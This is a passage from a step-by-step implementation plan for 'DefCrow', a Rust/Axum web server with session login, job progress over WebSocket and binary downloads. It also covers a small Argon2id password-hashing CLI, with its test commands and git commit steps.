        .route("/api/download/:id",    get(api::download::download_artifact))
        .layer(middleware::from_fn_with_state(sessions.clone(), require_auth));

    Router::new()
        // Auth (no protection needed)
        .route("/api/auth/login",  post(api::auth::login))
        .route("/api/auth/logout", post(api::auth::logout))
        // Health
        .route("/api/health", get(|| async { "ok" }))
        // WebSocket (auth handled inside handler via query param or header)
        .route("/ws/jobs/:id", get(ws::progress::ws_job_progress))
        // Protected routes
        .merge(protected)
        // Serve React frontend static files
        .nest_service("/", ServeDir::new("frontend/dist"))
        // Shared state
        .with_state(cfg)
        .with_state(sessions)
        .with_state(jobs)
        .layer(CorsLayer::permissive())
}

#[tokio::main]
async fn main() {
    tracing_subscriber::fmt()
        .with_env_filter(EnvFilter::from_default_env())
        .init();

    let cfg = Config::from_env().expect("failed to load config");

    // Pre-compile scaffold on startup
    let workspace = std::env::var("DEFCROW_WORKSPACE")
        .unwrap_or_else(|_| ".".into());
    let rlib_path = build_scaffold_rlib(&workspace)
        .expect("failed to build scaffold");

    let mut cfg = cfg;
    cfg.scaffold_rlib = rlib_path;

    let sessions = SessionStore::new();
    let jobs     = JobStore::new();
    let addr     = format!("0.0.0.0:{}", cfg.port);
    let app      = build_router(cfg, sessions, jobs);

    tracing::info!("DefCrow server listening on {}", addr);
    let listener = tokio::net::TcpListener::bind(&addr).await.unwrap();
    axum::serve(listener, app).await.unwrap();
}
```

- [ ] **Step 2: Run full test suite**

```bash
cargo test -p web-server
```

Expected: all tests pass

- [ ] **Step 3: Test server startup manually**

```bash
DEFCROW_PASSWORD_HASH=$(cargo run --bin defcrow-cli -- hash-password) \
DEFCROW_SESSION_SECRET=dev_secret_change_me \
DEFCROW_PORT=8080 \
cargo run -p web-server
```

Expected: `DefCrow server listening on 0.0.0.0:8080`

- [ ] **Step 4: Commit**

```bash
git add web-server/src/main.rs
git commit -m "feat(server): Axum router assembly + server startup with scaffold pre-build"
```

---

### Task 10: defcrow-cli (Password Hash Helper)

**Files:**
- Create: `defcrow-cli/src/main.rs`
- Create: `defcrow-cli/Cargo.toml`

- [ ] **Step 1: Create CLI crate**

```toml
# defcrow-cli/Cargo.toml
[package]
name = "defcrow-cli"
version = "0.1.0"
edition = "2021"

[dependencies]
argon2 = "0.5"
rand = "0.8"
```

- [ ] **Step 2: Implement hash-password command**

```rust
// defcrow-cli/src/main.rs
use argon2::{
    password_hash::{rand_core::OsRng, PasswordHasher, SaltString},
    Argon2,
};
use std::io::{self, BufRead, Write};

fn main() {
    let args: Vec<String> = std::env::args().collect();
    if args.get(1).map(|s| s.as_str()) == Some("hash-password") {
        print!("Enter password: ");
        io::stdout().flush().unwrap();
        let stdin = io::stdin();
        let password = stdin.lock().lines().next()
            .expect("no input").expect("read error");

        let salt = SaltString::generate(&mut OsRng);
        let hash = Argon2::default()
            .hash_password(password.as_bytes(), &salt)
            .expect("hashing failed")
            .to_string();
        println!("{}", hash);
        println!("\nAdd to .env:\nDEFCROW_PASSWORD_HASH={}", hash);
    } else {
        eprintln!("Usage: defcrow-cli hash-password");
        std::process::exit(1);
    }
}
```

- [ ] **Step 3: Test CLI**

```bash
echo "mypassword" | cargo run -p defcrow-cli -- hash-password
```

Expected: prints `$argon2id$v=19$m=65536,t=3,p=4$...` PHC string

- [ ] **Step 4: Add to workspace + commit**

Add `"defcrow-cli"` to `Cargo.toml` members, then:

```bash
git add defcrow-cli/
git commit -m "feat(cli): defcrow-cli hash-password utility for .env setup"
```

---

## Summary

After completing all 10 tasks:
- `web-server` serves REST API + WebSocket on configured port
- Argon2id login → 64-char session token → 24h TTL
- `POST /api/generate` → async tokio task → scaffold compile → progress via WebSocket
- `GET /ws/jobs/:id` → real-time server-push progress (queued→building→done/error)
- `GET /api/download/:id` → binary stream download
- `defcrow-cli hash-password` for initial setup

**Next:** Plan 3/3 — `frontend` (React+Vite login, generator UI, job status with WebSocket)
